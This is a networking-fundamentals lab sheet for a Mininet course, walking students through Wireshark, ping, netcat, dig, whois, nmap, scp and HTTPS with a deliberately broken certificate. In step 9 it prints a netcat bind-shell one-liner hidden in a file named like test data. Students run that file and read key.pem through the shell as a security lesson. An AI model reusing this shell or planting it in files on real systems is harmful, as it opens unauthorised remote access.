# 01 · Networking Fundamentals & Tools

[:material-file-pdf-box: Download as PDF](../pdf/01-netzwerkgrundlagen-tools.pdf){ .md-button }

## Learning objectives

- Not just name the TCP/IP layer model, but recognize it in real traffic
  captured with Wireshark (link, network, transport and application layer).
- Confidently use basic network tools: `ping`, `netcat`, `dig`, `curl`,
  `whois`, `nmap`, `scp`, `netstat`.
- Distinguish between a numeric IP address and name resolution (DNS), and
  between an application protocol (HTTP) and a service protocol (DNS, DHCP).
- Distinguish encrypted from unencrypted communication in a Wireshark
  capture (plaintext netcat/HTTP vs. SSH/SCP/HTTPS) and name the limits of
  encryption (metadata stays visible even if the content does not).
- Recognize and explain a broken TLS certificate state in the browser
  instead of clicking through it.
- Understand why, in a routed topology, not every host can reach every
  other host directly (asymmetric routing).

## Tasks

### Part 1 – The TCP/IP layer model in real traffic (outside of Mininet)

This first part does **not** run inside the Mininet emulation, but directly
on your desktop, to observe real communication to the internet before we
look at the controlled, emulated topology of `topo01`.

!!! note "Correction relative to the original document"
    The original refers to opening a "Zutty session" for this step. Zutty
    was a terminal program from an older lab environment; in the current
    desktop you instead start a terminal via the standard terminal icon
    (`xfce4-terminal`), see
    [Desktop/Mininet Environment](../reference/umgebung.md). This only
    affects *opening a terminal window on the desktop* — the Mininet command
    `mininet> xterm h1` used later in this lab sheet is unaffected and keeps
    working exactly as documented (see Part 2).

1. Open a terminal on the desktop and start Wireshark with elevated
   privileges so that all interfaces are visible:

   ```bash
   sudo wireshark
   ```

   Start capturing on **all** interfaces (you don't need a Mininet topology
   for this part).

2. In a second terminal, determine the IP address of `becke.net`:

   ```bash
   nslookup becke.net
   ```

   Note the returned IPv4 address — you'll need it in a moment for the
   Wireshark filter.

3. Generate traffic to that address:

   ```bash
   curl https://becke.net
   ```

4. Filter Wireshark to exactly this traffic so you don't have to search
   through the rest of the operating system's background noise:

   ```text
   ip.addr == <the IP address you determined>
   ```

5. Pick one of the TCP packets from this communication and identify, in the
   middle Wireshark pane, all four layers of the TCP/IP suite and their
   respective protocol data units:

    - **Application layer:** HTTP (or TLS record for HTTPS)
    - **Transport layer:** TCP segment (ports, sequence numbers, flags)
    - **Network layer:** IP header (IPv4 or IPv6, source/destination address)
    - **Link layer:** Ethernet header (MAC addresses)

6. Repeat the experiment locally, without leaving the machine:

   ```bash
   ping 127.0.0.1
   ```

   Filter Wireshark on `icmp` and identify the four layers again. What
   stands out at the link layer (layer 1/2) compared to the previous "real"
   packets? (Hint: loopback has no real Ethernet transmission, so the
   link-layer headers are missing or different.)

!!! tip "Track progress (optional)"
    Finished this part? Optionally note it for the admin overview
    (purely local, no network connection):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil1
    ```


### Part 2 – Tools in the emulated topology `topo01`

From here on you work inside the Mininet emulation. The `topo01` topology
consists of two end hosts `h1` and `h2`, two routers `r1`/`r2` in between,
and a NAT uplink to the real internet.

1. **Start the network.** Change into the topology directory and start the
   emulation:

   ```bash
   cd ~/rn-practice/topo01
   ./start-topo01.sh
   ```

   The script first calls `getIntWithIntenet.sh` (determines the network
   interface with internet access for the NAT uplink) and then starts
   `topo01.py`. On some installations you will be asked for the `sudo`
   password (`mininet`).

   !!! warning "Mind the order"
       Never call `topo01.py` directly without running
       `getIntWithIntenet.sh` first (`start-topo01.sh` does this
       automatically for you). Details in the
       [Potential Challenges](#potential-challenges) section below.

   After starting, two terminal windows open automatically — one for `h1`,
   one for `h2` (Mininet starts these itself via its internal `makeTerm()`
   function; you don't need to do anything extra for this). For the routers
   `r1`/`r2`, or if you accidentally close one of the two windows, open
   another terminal from the Mininet console with:

   ```text
   mininet> xterm <node>
   ```

   e.g. `mininet> xterm r1`. This command remains an unchanged part of the
   documented Mininet workflow and continues to work in the current
   environment exactly as described.

   !!! note "Playwright screenshot reference"
       To verify that a terminal window for the node actually opens after
       `./start-topo01.sh` or `mininet> xterm <node>`, a **window
       screenshot** (see `tests/e2e/specs/screenshots.spec.ts`, test
       "Window screenshot: default terminal is open") is better suited than
       a line screenshot: this is about the visible UI state (a new window
       is present), not a single line of text.

2. **Check connectivity with ping.** Open the terminal for `h1` and run, in
   order:

   ```bash
   ping -c 4 10.0.6.2       # ping with numeric IPv4 address (h2)
   ping -c 4 h2             # ping by name instead of IP
   ping -c 4 10.0.5.1       # ping another system on the local segment
   ping -c 4 141.22.27.238  # ping the internet (numeric)
   ping -c 4 cads-docker.cpt.haw-hamburg.de   # ping the internet by name
   ```

   Note the output (RTT, TTL). Compare the times: what stands out, and how
   do you explain the differences between the local target and the internet
   target?

   Then switch to the `h2` terminal and repeat the experiment from its
   point of view:

   ```bash
   ping -c 4 10.0.1.1
   ping -c 4 h1
   ping -c 4 141.22.27.238
   ping -c 4 cads-docker.cpt.haw-hamburg.de
   ```

   Compare RTT and TTL between the results on `h1` and `h2`. Why are they
   different? What does that tell you about the number of intermediate hops?

   !!! warning "h1 ↔ h2 directly: ping not possible"
       A direct `ping` between `h1` and `h2` fails, or shows packet loss, in
       this topology. This is **not an environment bug**, it's intentional:
       `h1` and `h2` are in different subnets and are only connected via the
       routers `r1`/`r2` with asymmetric routing. That is exactly the
       observation the next sub-task asks you to make — see also
       [Potential Challenges](#potential-challenges).

3. **Observe ping with Wireshark.** On `h2`, open Wireshark in the
   background and select the `h2-eth0` interface:

   ```bash
   wireshark &
   ```

   Switch to the `h1` terminal and send a single ping:

   ```bash
   ping -c 1 h2
   ```

   Which protocols appear in the "Protocol" column? Repeat the ping two more
   times (`ping -c 1 h2`) — which packet types repeat, which don't? Then run
   `ping -c 1 10.0.2.3` (a non-existent address) and observe the difference.
   Afterwards close the Wireshark window on `h2`, start Wireshark on `h1`
   instead (interface `h1-eth0`, don't forget `wireshark &` with `&` so the
   terminal stays usable) and repeat `ping -c 1 10.0.2.3`. Compare what is
   visible on both sides and formulate a hypothesis why the observation
   differs.

4. **Establish communication with netcat and observe it with Wireshark.**
   On `h2` (in the `~/rn-practice/topo01` directory), start the prepared UDP
   netcat server:

   ```bash
   ./startUDPServerNetcat.sh
   ```

   The script's content (`cat startUDPServerNetcat.sh`) shows you that it
   ultimately just calls `netcat -ul 8080` — a UDP listener on port 8080.
   Switch to `h1` and connect:

   ```bash
   netcat -u h2 8080
   hallo
   ```

   In Wireshark (on `h2`, interface `h2-eth0`), mark the last UDP packet. In
   the lower pane ("Packet Bytes") you see the payload in hex and ASCII —
   your "hallo" should appear there. Check how many bytes the payload
   actually occupies and why (hint: ASCII encoding, one character = one
   byte).

5. **DNS resolution with dig.** A lightweight DNS forwarder/DHCP server
   (`dnsmasq`) runs on `h1`. Run:

   ```bash
   dig bundesregierung.de
   ```

   and look in the `ANSWER SECTION` for the resolved IPv4 address.

6. **HTTP/REST with curl against an external API, and the same service in
   the browser.** Use curl to query the geolocation API of ip-api.com
   (replace the example address with the one you determined via `dig`
   above):

   ```bash
   curl http://ip-api.com/json/<determined-IP-address>
   ```

   Compare the result with calling the same query in the browser at
   `https://ip-api.com/#<determined-IP-address>`. Which representation is
   suited for automatic processing by a program, and which for a human?

   !!! note "Correction relative to the original document"
       The original document describes ip-api.com as operated by "Klaxoon
       SAS". That is incorrect: according to the official imprint/terms of
       use of ip-api.com, the service is operated by **Artia International
       S.R.L.** (Bucharest, Romania). Klaxoon is an independent,
       France-based collaboration software company with no connection to
       ip-api.com.

7. **WHOIS lookup.** On `h1`:

   ```bash
   whois mozilla.com
   ```

   Pay attention to fields like street/city. Repeat the lookup with
   `bundesregierung.de` and compare: for `.de` domains, DENIC is
   responsible, and since GDPR, personal WHOIS data for `.de` domains is no
   longer publicly visible by default.

8. **Network scan with nmap.** On `h2`:

   ```bash
   nmap -sn 10.0.4.0/24
   ```

   Check which hosts are detected. Then try to identify the operating
   system of a found host:

   ```bash
   nmap -O <found-IP>
   ```

   Find out on which host the OpenSSH service is reachable, and use
   `searchsploit` to check for known vulnerabilities:

   ```bash
   searchsploit OpenSSH
   ```

   Port scans here serve only your own, isolated Mininet environment.
   Against foreign systems without consent they are legally sensitive and
   partly a criminal offense in Germany.

9. **Secure transfer with SCP, and what remains visible despite
   encryption.** On `h2`, start Wireshark (interface `h2-eth0`). On `h1`,
   start the SSH server:

   ```bash
   /usr/sbin/sshd -D -f sshd.conf
   ```

   Then, from `h2`, copy a file from `h1`:

   ```bash
   scp mininet@10.0.1.2:~/rn-practice/test30M.txt ./
   ```

   !!! note "Correction relative to the original document"
       The original document inconsistently uses `~`,
       `/home/mininet/rn-practice/topo01` and `/headless/rn-practice/` for
       the source path. The path that actually exists in this repository is
       consistently `~` instead of the differing paths from the original —
       `test30M.txt` itself is located directly under `~/rn-practice/` (the
       root of the vendored directory), NOT under
       `~/rn-practice/topo01/` (verified against the repository structure,
       see `mininet-labs/rn-practice/test30M.txt`).

   !!! warning "test30M.txt contains a real reverse shell — this is intentional (see ADR 0017)"
       `test30M.txt` sounds like a ~30 MB test file, but actually contains
       only a short netcat bind-shell one-liner
       (`mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 1234 >/tmp/f`) plus
       self-deletion, commented as "this is a secret script". An earlier
       version of this guide incorrectly classified this as an accidentally
       committed backdoor and replaced the content with harmless filler
       text — that was a mistake and has been reverted (see
       [ADR 0017](../adr/0017-test30m-backdoor-remediation.md)). This is a
       **deliberately designed security lesson**: encrypting the transfer
       (SCP/SSH) only protects the transport path, not the trust decision
       about the content at the endpoint.

   Observe the TCP three-way handshake, the SSH negotiation phase, and then
   consistently encrypted traffic in Wireshark — the file content itself is
   not visible. Look at the copied file locally:

   ```bash
   cat test30M.txt
   ```

   It contains a netcat call. Run it as a test, to demonstrate a (harmless
   in this isolated exercise) reverse shell:

   ```bash
   sh ./test30M.txt
   ```

   After execution the file is deleted and apparently nothing significant
   happened. In fact, however, a reverse shell has opened. Connect from
   `h1` to the opened shell and check which host you're actually executing
   commands on:

   ```bash
   netcat 10.0.6.2 1234
   ifconfig
   ```

   If an `h2-eth0` interface appears, you have access to `h2` — even though
   you issued the command from `h1`. Activate the Wireshark capture on
   `h2-eth0` again and look at another file via the reverse shell:

   ```bash
   cat key.pem
   ```

   Using "Follow → TCP Stream" the complete, unencrypted communication can
   be reconstructed in Wireshark — unlike SCP/SSH, this channel was never
   encrypted at any point. Reflect on advantages and disadvantages from the
   perspective of the user, the administrator, and security authorities.

   Finally, on `h2`, check which processes are holding network ports open,
   and kill any unrecognized processes:

   ```bash
   netstat -tulnp
   kill -9 <PID>
   ```

10. **Encrypted web traffic and a deliberately broken certificate.** On
    `h1`, start a simple HTTP server:

    ```bash
    python3 startHTTPServer.py &
    ```

    Use `netstat` to check that port 80 is now in use. On `h2`, start
    Wireshark (interface `h2-eth0`) and set the display filter:

    ```text
    ip.addr == 10.0.1.2 && tcp
    ```

    Start the browser on `h2`:

    ```bash
    ./runSimpleBrowser.sh
    ```

    and navigate to `http://h1`. In Wireshark ("Follow → TCP Stream"),
    compare the HTTP/HTML content with the page visible in the browser, or
    with "View Page Source".

    Stop the HTTP server on `h1` (++ctrl+c++) and instead start the HTTPS
    server:

    ```bash
    python3 startHTTPsServer.py
    ```

    On `h2`, navigate to `https://h1` and observe again in Wireshark that
    the content is no longer visible in plaintext this time.

    !!! warning "Deliberately broken certificate"
        The browser will show a certificate warning. This is
        **intentional**: `cert.pem`/`key.pem` in `topo01` are a deliberately
        nonsensical, self-signed test certificate (`CN=noway`, organization
        "Not your buisness", department "bad company") — not a
        configuration mistake in the environment. The actual learning
        objective of this step is for you, as a user *without* an IT
        background, to recognize and articulate what's wrong with this
        certificate (e.g. an unsuitable/unknown issuer, a common name
        unrelated to the requested name `h1`).

    !!! note "Playwright screenshot reference"
        To document the `dig`/`nmap` output or the certificate warning in
        the browser, a **line/locator screenshot** (see
        `tests/e2e/specs/screenshots.spec.ts`, test "Line screenshot") is
        better suited than a window screenshot: this is about the content
        of a specific output line or a warning element, not the whole
        visible window state.

11. **Stop the network.** On the Mininet console:

    ```text
    mininet> quit
    ```

!!! tip "Track progress (optional)"
    Finished this part? Optionally note it for the admin overview
    (purely local, no network connection):

    ```bash
    ~/rn-practice/mark-done.sh 01 teil2
    ```


## Potential challenges

- **`getIntWithIntenet.sh` must run before `topo01.py`.** `topo01.py` reads
  a file `interface.txt` at startup which contains the interface name and
  gateway address for the NAT uplink. This file is generated by
  `getIntWithIntenet.sh`. Anyone who calls `topo01.py` directly (instead of
  via `./start-topo01.sh`, which runs both steps in the right order) gets a
  `FileNotFoundError` without a helpful error message pointing to the
  actual cause.
- **`cert.pem`/`key.pem` are deliberately broken.** The certificate carries
  `CN=noway` and obviously nonsensical organization fields. This is not a
  bug, but the learning objective of task 10: recognizing and classifying a
  certificate error as a layperson.
- **`h1` ↔ `h2` directly: ping not possible.** The topology connects `h1`
  and `h2` only indirectly via the routers `r1`/`r2` with asymmetric
  routing between the two subnets. A `pingall` in this topology shows
  packet loss between `h1` and `h2` by design — that is part of the
  learning task (question 2 in this lab sheet), not a defect of the
  environment. Verified technical details are in the update section of
  [ADR 0002](../adr/0002-capabilities-not-privileged.md).
- **Inconsistent path references in the original.** The original document
  mixes `~/rn-practice/topo01`, `/home/mininet/rn-practice/topo01` and
  `/headless/rn-practice/...`. This lab sheet consistently uses
  `~/rn-practice/topo01`, the path actually verified in this environment.
- **`mininet> xterm <node>` still works, but is technically a shim.** The
  command remains usable for you unchanged, but internally opens
  `xfce4-terminal` instead of a real `xterm` program. This is irrelevant to
  the tasks, but can be confusing if you wonder why the opened window
  doesn't look like a classic X11 `xterm`.

## Sources

- `mininet-labs/intro/01-Basis-Netzwerktools.tex`
- `mininet-labs/vertiefung/Labor-01-Schichtenmodelle.tex`
- `mininet-labs/rn-practice/topo01/`
